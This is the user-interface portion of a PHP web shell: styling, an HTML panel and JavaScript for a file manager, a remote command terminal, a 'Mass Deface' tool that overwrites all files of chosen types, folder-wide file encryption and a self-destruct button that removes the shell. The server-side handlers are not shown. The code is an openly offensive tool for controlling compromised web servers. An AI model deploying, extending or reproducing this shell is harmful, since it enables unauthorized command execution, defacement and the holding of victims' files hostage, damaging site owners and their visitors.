        color: var(--success);
        border: 1px solid rgba(0, 255, 136, 0.3);
    }
    .message.error {
        background: rgba(255, 68, 68, 0.1);
        color: var(--danger);
        border: 1px solid rgba(255, 68, 68, 0.3);
    }
    @media (max-width: 768px) {
        .app-header {
            flex-direction: column;
            align-items: stretch;
            gap: 12px;
        }
        .header-left {
            flex-direction: column;
            align-items: stretch;
        }
        .tabs-container {
            padding: 10px;
        }
        .tab-btn {
            padding: 12px 16px;
            font-size: 14px;
            min-height: 44px;
        }
        .path-form {
            flex-direction: column;
        }
        .batch-controls {
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
        }
        .batch-actions {
            margin-left: 0;
            width: 100%;
            justify-content: flex-start;
        }
        .file-item {
            flex-direction: column;
            align-items: stretch;
            gap: 15px;
        }
        .file-actions {
            justify-content: flex-start;
        }
        .terminal-form {
            flex-direction: column;
        }
        .modal-content {
            margin: 10px;
        }
        .modal-body {
            padding: 15px;
        }
        .modal-textarea {
            height: 400px;
        }
    }
    @media (max-width: 480px) {
        .main-content {
            padding: 15px;
        }
        .section-title {
            font-size: 16px;
        }
        .file-btn {
            padding: 8px 12px;
            font-size: 12px;
        }
        .batch-btn {
            padding: 6px 12px;
            font-size: 12px;
        }
        .file-details {
            flex-direction: column;
            gap: 5px;
        }
    }
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }
    @keyframes slideIn {
        from { opacity: 0; transform: translateX(-20px); }
        to { opacity: 1; transform: translateX(0); }
    }
    .hidden {
        display: none !important;
    }
    .loading {
        opacity: 0.7;
        pointer-events: none;
        position: relative;
    }
    .loading::after {
        content: "";
        position: absolute;
        top: 50%;
        left: 50%;
        width: 24px;
        height: 24px;
        border: 3px solid var(--primary);
        border-radius: 50%;
        border-top-color: transparent;
        animation: spin 1s linear infinite;
        margin-top: -12px;
        margin-left: -12px;
    }
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }
    ::-webkit-scrollbar-track {
        background: var(--bg-light);
    }
    ::-webkit-scrollbar-thumb {
        background: var(--primary);
        border-radius: 4px;
    }
    ::-webkit-scrollbar-thumb:hover {
        background: var(--primary-dark);
    }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="app-header">
            <div class="header-left">
                <div class="header-title">File Manager</div>
                <div class="current-path" title="' . htmlspecialchars($path) . '">📁 ' . htmlspecialchars($path) . '</div>
            </div>
            <div class="header-actions">
                <button class="quick-btn" onclick="location.reload()">🔄 Refresh</button>
                <button class="quick-btn" onclick="showTab(\'files\')">📁 Files</button>
                <form method="post" style="display:inline">
                    <input type="hidden" name="logout" value="1">
                    <button type="submit" class="quick-btn">🚪 Logout</button>
                </form>
            </div>
        </div>
        <div class="tabs-container">
            <button class="tab-btn ' . ($action == 'index' ? 'active' : '') . '" onclick="showTab(\'files\')">
                📁 File Manager
            </button>
            <button class="tab-btn ' . ($action == 'terminal' ? 'active' : '') . '" onclick="showTab(\'terminal\')">
                💻 Terminal
            </button>
            <button class="tab-btn ' . ($action == 'deface' ? 'active' : '') . '" onclick="showTab(\'deface\')">
                🎯 Mass Deface
            </button>
            <button class="tab-btn danger" onclick="selfDestruct()">
                💥 Self Destruct
            </button>
        </div>
        <div class="main-content">';

if (isset($_SESSION['message'])) {
    echo '<div class="message success">✅ ' . htmlspecialchars($_SESSION['message']) . '</div>';
    unset($_SESSION['message']);
}
if (isset($_SESSION['error'])) {
    echo '<div class="message error">❌ ' . htmlspecialchars($_SESSION['error']) . '</div>';
    unset($_SESSION['error']);
}

echo '<div id="files" class="tab-content ' . ($action == 'index' ? 'active' : '') . '">
    <div class="path-nav">
        <form method="get" class="path-form">
            <input type="hidden" name="a" value="index">
            <input type="text" name="p" class="path-input" value="' . htmlspecialchars($path) . '" placeholder="Enter path...">
            <button type="submit" class="path-btn">Go</button>
        </form>
        <div class="quick-actions">
            <button class="quick-btn" onclick="location.href=\'?a=index&p=' . urlencode(dirname($path)) . '\'">
                ⬆️ Parent Directory
            </button>
            <button class="quick-btn" onclick="location.href=\'?a=index&p=' . urlencode(__DIR__) . '\'">
                🏠 Home
            </button>
            <button class="quick-btn" onclick="showEncryptFolder()">
                🔐 Encrypt All
            </button>
            <button class="quick-btn" onclick="showDecryptFolder()">
                🔓 Decrypt All
            </button>
        </div>
    </div>
    <div class="upload-box">
        <h3 class="section-title">📤 Upload Files</h3>
        <form method="post" enctype="multipart/form-data" id="uploadForm">
            <input type="hidden" name="a" value="upload">
            <input type="hidden" name="p" value="' . htmlspecialchars($path) . '">
            <input type="file" class="form-input" name="upload[]" multiple>
            <button type="submit" class="btn-primary">
                📤 Upload Selected Files
            </button>
        </form>
    </div>
    <div class="create-forms">
        <div class="create-form">
            <h3 class="section-title">📄 Create File</h3>
            <form method="post">
                <input type="hidden" name="a" value="newfile">
                <input type="hidden" name="p" value="' . htmlspecialchars($path) . '">
                <input type="text" name="filename" class="form-input" placeholder="filename.ext" required>
                <button type="submit" class="btn-primary">➕ Create File</button>
            </form>
        </div>
        <div class="create-form">
            <h3 class="section-title">📁 Create Folder</h3>
            <form method="post">
                <input type="hidden" name="a" value="newfolder">
                <input type="hidden" name="p" value="' . htmlspecialchars($path) . '">
                <input type="text" name="foldername" class="form-input" placeholder="Folder Name" required>
                <button type="submit" class="btn-primary">📁 Create Folder</button>
            </form>
        </div>
    </div>
    <div class="files-container">
        <div class="files-header">
            <h3 class="section-title">📄 Files & Directories</h3>
            <div class="files-count">' . count(listFiles($path)) . ' items</div>
        </div>
        <div class="batch-controls" id="batchControls" style="display: none;">
            <input type="checkbox" id="selectAll" class="batch-checkbox" onchange="toggleAllCheckboxes()">
            <label for="selectAll" class="batch-label">Select All</label>
            <div class="batch-actions">
                <button type="button" class="batch-btn" onclick="batchAction(\'zip\')">🗜️ Zip Selected</button>
                <button type="button" class="batch-btn danger" onclick="batchAction(\'delete\')">🗑️ Delete Selected</button>
                <button type="button" class="batch-btn" onclick="clearSelection()">❌ Clear</button>
            </div>
        </div>
        <form id="batchForm" method="post" style="display: none;">
            <input type="hidden" name="a" id="batchActionType">
            <input type="hidden" name="p" value="' . htmlspecialchars($path) . '">
        </form>
        <div class="file-list">';

$files = listFiles($path);
if (empty($files)) {
    echo '<div style="text-align: center; padding: 40px; color: var(--text-secondary);">
            📁 Empty directory
          </div>';
} else {
    foreach ($files as $f) {
        $encrypted = isEncrypted($f['path']);
        $isDir = $f['is_dir'];
        $icon = $isDir ? '📁' : '📄';
        $size = $isDir ? 'Directory' : formatBytes($f['size']);
        
        echo '<div class="file-item">
                <input type="checkbox" class="file-checkbox" name="selected_files[]" value="' . htmlspecialchars($f['path']) . '" onchange="updateBatchControls()">
                <div class="file-icon">' . $icon . '</div>
                <div class="file-info">
                    <div class="file-name">' . htmlspecialchars($f['name']) . '</div>
                    <div class="file-details">
                        <span class="file-detail">📏 ' . $size . '</span>
                        <span class="file-detail">🔒 ' . $f['perm'] . '</span>
                        <span class="file-detail">🕐 ' . $f['time'] . '</span>
                        ' . ($encrypted ? '<span class="file-detail" style="color:#ff4444">🔐 ENCRYPTED</span>' : '') . '
                    </div>
                </div>
                <div class="file-actions">';
        
        if ($isDir) {
            echo '<a href="?a=index&p=' . urlencode($f['path']) . '">
                    <button class="file-btn">📂 Open</button>
                  </a>';
        } else {
            echo '<button class="file-btn" onclick="editFile(\'' . addslashes($f['path']) . '\')">
                    ✏️ Edit
                  </button>
                  <a href="?a=download&f=' . urlencode($f['path']) . '" download>
                    <button class="file-btn">📥 Download</button>
                  </a>';
            
            if ($encrypted) {
                echo '<button class="file-btn" onclick="showDecryptModal(\'' . addslashes($f['path']) . '\')">
                        🔓 Decrypt
                      </button>';
            } else {
                echo '<button class="file-btn" onclick="showEncryptModal(\'' . addslashes($f['path']) . '\')">
                        🔐 Encrypt
                      </button>';
            }
        }
        
        echo '  <button class="file-btn" onclick="showRenameModal(\'' . addslashes($f['path']) . '\', \'' . addslashes($f['name']) . '\')">
                    🏷️ Rename
                </button>
                <button class="file-btn" onclick="showChmodModal(\'' . addslashes($f['path']) . '\', \'' . $f['perm'] . '\')">
                    🔧 Chmod
                </button>
                <form method="post" style="display:inline" onsubmit="return confirm(\'Delete ' . ($isDir ? 'folder' : 'file') . '?\')">
                    <input type="hidden" name="a" value="delete">
                    <input type="hidden" name="f" value="' . htmlspecialchars($f['path']) . '">
                    <button type="submit" class="file-btn danger">🗑️ Delete</button>
                </form>
              </div>
            </div>';
    }
}

echo '</div>
    </div>
</div>
<div id="terminal" class="tab-content ' . ($action == 'terminal' ? 'active' : '') . '">
    <div class="terminal-box">
        <div class="terminal-header">
            💻 System Terminal
            <span style="font-size:12px; opacity:0.8">' . php_uname('s') . ' - ' . php_uname('r') . '</span>
        </div>
        <div class="terminal-body">
            <form method="post" class="terminal-form" id="terminalForm">
                <input type="hidden" name="a" value="exec">
                <input type="text" name="cmd" class="terminal-input" placeholder="Enter command (try: ls -la, pwd, whoami)" autocomplete="off" id="cmdInput" value="' . (isset($_SESSION['last_command']) ? htmlspecialchars($_SESSION['last_command']) : '') . '">
                <button type="submit" class="path-btn">Execute</button>
            </form>
            <div class="terminal-output" id="terminalOutput">';

if (isset($_SESSION['terminal_output'])) {
    echo htmlspecialchars($_SESSION['terminal_output']);
    unset($_SESSION['terminal_output']);
    unset($_SESSION['last_command']);
} else {
    echo 'Ready for commands... Try: ls -la, pwd, whoami, id';
}

echo '</div>
        </div>
    </div>
</div>
<div id="deface" class="tab-content ' . ($action == 'deface' ? 'active' : '') . '">
    <div class="deface-box">
        <h3 class="section-title">🎯 Mass Deface Tool</h3>
        <div class="deface-method">
            <button type="button" class="method-btn active" onclick="setDefaceMethod(\'upload\')">
                📤 Upload File
            </button>
            <button type="button" class="method-btn" onclick="setDefaceMethod(\'code\')">
                📝 Insert Code
            </button>
        </div>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="a" value="massdeface">
            <input type="hidden" name="p" value="' . htmlspecialchars($path) . '">
            <input type="hidden" name="method" id="defaceMethod" value="upload">
            <div class="form-input" style="margin-bottom:20px">
                <label style="display:block; margin-bottom:8px; color:var(--primary)">Target Extensions:</label>
                <input type="text" name="extensions" value="html,htm,php,js,css,txt,asp,aspx" 
                       placeholder="Comma separated extensions" style="width:100%">
            </div>
            <div id="defaceUpload" class="deface-section active">
                <div class="form-input">
                    <label style="display:block; margin-bottom:8px; color:var(--primary)">Select Deface File:</label>
                    <input type="file" name="deface_file" accept=".html,.htm,.php,.txt">
                </div>
            </div>
            <div id="defaceCode" class="deface-section">
                <div class="form-input">
                    <label style="display:block; margin-bottom:8px; color:var(--primary)">Deface Code:</label>
                    <textarea name="code" rows="10" placeholder="<html><body><h1>HACKED</h1></body></html>" style="width:100%; font-family:monospace"></textarea>
                </div>
            </div>
            <button type="submit" class="btn-primary danger" onclick="return confirm(\'⚠️ This will modify ALL files with specified extensions. Continue?\')">
                🚀 Execute Mass Deface
            </button>
        </form>
    </div>
</div>
<div id="editModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            ✏️ Edit File
            <button onclick="closeModal(\'editModal\')" style="background:none; border:none; color:#000; font-size:24px; cursor:pointer">×</button>
        </div>
        <div class="modal-body">
            <textarea id="editContent" class="modal-textarea" spellcheck="false"></textarea>
            <input type="hidden" id="editFilePath">
            <div class="modal-actions">
                <button onclick="saveFile()" class="path-btn" style="min-width:120px">💾 Save</button>
                <button onclick="closeModal(\'editModal\')" class="quick-btn">❌ Close</button>
            </div>
        </div>
    </div>
</div>
<div id="encryptModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            🔐 Encrypt File
            <button onclick="closeModal(\'encryptModal\')" style="background:none; border:none; color:#000; font-size:24px; cursor:pointer">×</button>
        </div>
        <div class="modal-body">
            <p style="margin-bottom:20px; color:var(--text-secondary)">Enter password for encryption:</p>
            <form id="encryptForm" method="post">
                <input type="hidden" name="a" value="encryptfile">
                <input type="hidden" id="encryptFile" name="f">
                <input type="password" name="pass" class="encrypt-input" placeholder="Encryption password" required autocomplete="new-password">
                <div class="modal-actions">
                    <button type="submit" class="path-btn">🔐 Encrypt</button>
                    <button type="button" onclick="closeModal(\'encryptModal\')" class="quick-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div id="decryptModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            🔓 Decrypt File
            <button onclick="closeModal(\'decryptModal\')" style="background:none; border:none; color:#000; font-size:24px; cursor:pointer">×</button>
        </div>
        <div class="modal-body">
            <p style="margin-bottom:20px; color:var(--text-secondary)">Enter decryption password:</p>
            <form id="decryptForm" method="post">
                <input type="hidden" name="a" value="decryptfile">
                <input type="hidden" id="decryptFile" name="f">
                <input type="password" name="pass" class="encrypt-input" placeholder="Decryption password" required autocomplete="new-password">
                <div class="modal-actions">
                    <button type="submit" class="path-btn">🔓 Decrypt</button>
                    <button type="button" onclick="closeModal(\'decryptModal\')" class="quick-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div id="renameModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            🏷️ Rename
            <button onclick="closeModal(\'renameModal\')" style="background:none; border:none; color:#000; font-size:24px; cursor:pointer">×</button>
        </div>
        <div class="modal-body">
            <form id="renameForm" method="post">
                <input type="hidden" name="a" value="rename">
                <input type="hidden" id="renameOld" name="old">
                <input type="text" id="renameNew" name="new" class="form-input" placeholder="New name" required>
                <div class="modal-actions">
                    <button type="submit" class="path-btn">💾 Rename</button>
                    <button type="button" onclick="closeModal(\'renameModal\')" class="quick-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            🔧 Change Permissions
            <button onclick="closeModal(\'chmodModal\')" style="background:none; border:none; color:#000; font-size:24px; cursor:pointer">×</button>
        </div>
        <div class="modal-body">
            <form id="chmodForm" method="post">
                <input type="hidden" name="a" value="chmod">
                <input type="hidden" id="chmodFile" name="f">
                <input type="text" id="chmodPerm" name="perm" class="form-input" placeholder="e.g., 755 or 644 (3-4 digits)" required pattern="[0-7]{3,4}" title="Enter 3-4 digits (0-7). Example: 755 for directories, 644 for files">
                <div style="margin:20px 0; padding:15px; background:var(--bg); border-radius:var(--radius-sm);">
                    <div style="color:var(--text-secondary); margin-bottom:10px">Common permissions:</div>
                    <div style="display:flex; gap:10px; flex-wrap:wrap">
                        <button type="button" class="quick-btn" onclick="document.getElementById(\'chmodPerm\').value=\'644\'">644 (File)</button>
                        <button type="button" class="quick-btn" onclick="document.getElementById(\'chmodPerm\').value=\'755\'">755 (Directory)</button>
                        <button type="button" class="quick-btn" onclick="document.getElementById(\'chmodPerm\').value=\'777\'">777 (Full)</button>
                        <button type="button" class="quick-btn" onclick="document.getElementById(\'chmodPerm\').value=\'600\'">600 (Private)</button>
                        <button type="button" class="quick-btn" onclick="document.getElementById(\'chmodPerm\').value=\'444\'">444 (Read Only)</button>
                    </div>
                </div>
                <div class="modal-actions">
                    <button type="submit" class="path-btn">💾 Apply</button>
                    <button type="button" onclick="closeModal(\'chmodModal\')" class="quick-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div id="encryptFolderModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            🔐 Encrypt All Files in Folder
            <button onclick="closeModal(\'encryptFolderModal\')" style="background:none; border:none; color:#000; font-size:24px; cursor:pointer">×</button>
        </div>
        <div class="modal-body">
            <p style="margin-bottom:20px; color:var(--text-secondary)">
                This will encrypt ALL files in the current folder. Make sure to remember the password!
            </p>
            <form method="post">
                <input type="hidden" name="a" value="encryptfolder">
                <input type="hidden" name="p" value="' . htmlspecialchars($path) . '">
                <input type="password" name="epass" class="encrypt-input" placeholder="Encryption password" required>
                <div class="modal-actions">
                    <button type="submit" class="path-btn" onclick="return confirm(\'Encrypt ALL files in this folder?\')">
                        🔐 Encrypt All
                    </button>
                    <button type="button" onclick="closeModal(\'encryptFolderModal\')" class="quick-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div id="decryptFolderModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            🔓 Decrypt All Files in Folder
            <button onclick="closeModal(\'decryptFolderModal\')" style="background:none; border:none; color:#000; font-size:24px; cursor:pointer">×</button>
        </div>
        <div class="modal-body">
            <p style="margin-bottom:20px; color:var(--text-secondary)">
                This will decrypt ALL encrypted files in the current folder.
            </p>
            <form method="post">
                <input type="hidden" name="a" value="decryptfolder">
                <input type="hidden" name="p" value="' . htmlspecialchars($path) . '">
                <input type="password" name="dpass" class="encrypt-input" placeholder="Decryption password" required>
                <div class="modal-actions">
                    <button type="submit" class="path-btn" onclick="return confirm(\'Decrypt ALL files in this folder?\')">
                        🔓 Decrypt All
                    </button>
                    <button type="button" onclick="closeModal(\'decryptFolderModal\')" class="quick-btn">Cancel</button>
                </div>
            </form>
        </div>
    </div>
</div>
</div>
</div>
</div>
<script>
function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return "0 Bytes";
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ["Bytes", "KB", "MB", "GB", "TB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + " " + sizes[i];
}
function showTab(tabId) {
    document.querySelectorAll(".tab-content").forEach(tab => {
        tab.classList.remove("active");
    });
    document.querySelectorAll(".tab-btn").forEach(btn => {
        btn.classList.remove("active");
    });
    document.getElementById(tabId).classList.add("active");
    event.target.classList.add("active");
    window.scrollTo(0, 0);
}
function closeModal(modalId) {
    document.getElementById(modalId).style.display = "none";
}
function showModal(modalId) {
    document.getElementById(modalId).style.display = "block";
}
async function editFile(filePath) {
    document.getElementById("editFilePath").value = filePath;
    document.getElementById("editContent").value = "Loading...";
    showModal("editModal");
    try {
        const response = await fetch("?a=getfile&f=" + encodeURIComponent(filePath));
        if (!response.ok) throw new Error("Network error");
        const content = await response.text();
        document.getElementById("editContent").value = content;
    } catch (error) {
        document.getElementById("editContent").value = "Error loading file: " + error.message;
    }
}
function saveFile() {
    const form = document.createElement("form");
    form.method = "POST";
    form.style.display = "none";
    const inputA = document.createElement("input");
    inputA.type = "hidden";
    inputA.name = "a";
    inputA.value = "saveedit";
    form.appendChild(inputA);
    const inputF = document.createElement("input");
    inputF.type = "hidden";
    inputF.name = "f";
    inputF.value = document.getElementById("editFilePath").value;
    form.appendChild(inputF);
    const inputContent = document.createElement("input");
    inputContent.type = "hidden";
    inputContent.name = "content";
    inputContent.value = document.getElementById("editContent").value;
    form.appendChild(inputContent);
    document.body.appendChild(form);
    form.submit();
}
function showEncryptModal(filePath) {
    document.getElementById("encryptFile").value = filePath;
    showModal("encryptModal");
}
function showDecryptModal(filePath) {
    document.getElementById("decryptFile").value = filePath;
    showModal("decryptModal");
}
function showEncryptFolder() {
    showModal("encryptFolderModal");
}
function showDecryptFolder() {
    showModal("decryptFolderModal");
}
function showRenameModal(oldPath, currentName) {
    document.getElementById("renameOld").value = oldPath;
    document.getElementById("renameNew").value = currentName;
    showModal("renameModal");
}
function showChmodModal(filePath, currentPerm) {
    document.getElementById("chmodFile").value = filePath;
    let displayPerm = currentPerm;
    if (currentPerm.length == 4 && currentPerm.charAt(0) == \'0\') {
        displayPerm = currentPerm.substring(1);
    }
    document.getElementById("chmodPerm").value = displayPerm;
    showModal("chmodModal");
}
function setDefaceMethod(method) {
    document.getElementById("defaceMethod").value = method;
    document.querySelectorAll(".method-btn").forEach(btn => {
        btn.classList.remove("active");
    });
    event.target.classList.add("active");
    document.getElementById("defaceUpload").classList.remove("active");
    document.getElementById("defaceCode").classList.remove("active");
    document.getElementById("deface" + method.charAt(0).toUpperCase() + method.slice(1)).classList.add("active");
}
function selfDestruct() {
    if (confirm("⚠️⚠️⚠️\\n\\nThis will DELETE the webshell file permanently!\\n\\nAre you absolutely sure?")) {
        const form = document.createElement("form");
        form.method = "POST";
        form.style.display = "none";
        const input = document.createElement("input");
        input.type = "hidden";
        input.name = "a";
        input.value = "selfdestruct";
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    }
}
function updateBatchControls() {
    const checkboxes = document.querySelectorAll(\'.file-checkbox:checked\');
    const batchControls = document.getElementById(\'batchControls\');
    if (checkboxes.length > 0) {
        batchControls.style.display = \'flex\';
    } else {
        batchControls.style.display = \'none\';
    }
}
function toggleAllCheckboxes() {
    const selectAll = document.getElementById(\'selectAll\');
    const checkboxes = document.querySelectorAll(\'.file-checkbox\');
    checkboxes.forEach(cb => {
        cb.checked = selectAll.checked;
    });
    updateBatchControls();
}
function clearSelection() {
    const checkboxes = document.querySelectorAll(\'.file-checkbox\');
    checkboxes.forEach(cb => {
        cb.checked = false;
    });
    document.getElementById(\'selectAll\').checked = false;
    updateBatchControls();
}
function batchAction(action) {
    const checkboxes = document.querySelectorAll(\'.file-checkbox:checked\');
    if (checkboxes.length === 0) {
        alert(\'Please select at least one file/folder.\');
        return;
    }
    
    const form = document.getElementById(\'batchForm\');
    const actionInput = document.getElementById(\'batchActionType\');
    
    if (action === \'delete\') {
        if (!confirm(`Are you sure you want to delete ${checkboxes.length} selected item(s)?`)) {
            return;
        }
        actionInput.value = \'batchdelete\';
    } else if (action === \'zip\') {
        if (!confirm(`Create zip archive from ${checkboxes.length} selected item(s)?`)) {
            return;
        }
        actionInput.value = \'batchzip\';
    }
    
    const selectedFiles = [];
    checkboxes.forEach(cb => {
        const hiddenInput = document.createElement(\'input\');
        hiddenInput.type = \'hidden\';
        hiddenInput.name = \'selected_files[]\';
        hiddenInput.value = cb.value;
        form.appendChild(hiddenInput);
        selectedFiles.push(cb.value);
    });
    
    form.submit();
}
document.getElementById("terminalForm")?.addEventListener("submit", function(e) {
    const output = document.getElementById("terminalOutput");
    const cmdInput = document.getElementById("cmdInput");
    if (output && cmdInput.value.trim()) {
        output.innerHTML = "Executing command: " + cmdInput.value + "\\n\\nPlease wait...";
        output.scrollTop = output.scrollHeight;
    }
});
document.addEventListener("keydown", function(e) {
    if (e.key === "Escape") {
        document.querySelectorAll(".modal").forEach(modal => {
            modal.style.display = "none";
        });
    }
});
document.querySelectorAll(".modal").forEach(modal => {
    modal.addEventListener("click", function(e) {
        if (e.target === this) {
            this.style.display = "none";
        }
    });
});
document.addEventListener("DOMContentLoaded", function() {
    const cmdInput = document.getElementById("cmdInput");
    if (cmdInput && document.getElementById("terminal").classList.contains("active")) {
        cmdInput.focus();
        cmdInput.select();
    }
    if (document.querySelector(".message")) {
        setTimeout(() => {
            document.querySelectorAll(".message").forEach(msg => {
                msg.style.opacity = "0";
                msg.style.transition = "opacity 0.5s";
                setTimeout(() => msg.remove(), 500);
            });
        }, 5000);
    }
    const terminalOutput = document.getElementById("terminalOutput");
    if (terminalOutput) {
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    }
});
</script>
</body>
</html>';

function formatBytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}
?>
